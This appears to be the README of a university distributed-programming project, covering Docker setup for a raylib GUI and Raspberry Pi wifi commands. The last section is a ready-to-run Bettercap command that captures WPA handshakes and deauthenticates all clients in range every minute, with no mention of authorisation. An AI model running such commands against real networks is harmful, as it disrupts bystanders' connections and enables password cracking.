# Distribuited Programming University Project 

# Dependencies

Since `client` within docker runs a GUI using `raylib`, we need to forward the desktop environment to docker.
So, an utility called `xhost` is needed (`xorg-xhost` package on arch).

Then run 

```bash
export DISPLAY=:0.0
xhost +local:docker
docker compose up --build -d
```

# Raspberry-Pi Useful commands

> Tested on Raspberry-Pi 5 Model B Rev. 2

> [!TIP]
> Change `wlan1` interface with your interface accordingly. Make sure your wifi card supports monitor mode and packet injection first.

## Set-Up monitor mode

```bash
sudo ip link set wlan1 down
sudo iw dev wlan1 set type monitor
sudo ip link set wlan1 up
```

## Useful Bettercap commands

```bash
sudo bettercap -iface wlan1
wifi.recon BBSID
wifi.recon on
```

## All-in one bettercap command

```bash
sudo bettercap -iface wlan1 -eval 'set wifi.handshakes.aggregate false; set wifi.handshakes.file ~/handshakes; wifi.recon on; wifi.recon.channel 3; set wifi.show.sort clients desc; set ticker.commands "wifi.deauth *; clear; wifi.show"; set ticker.period 60; ticker on';
```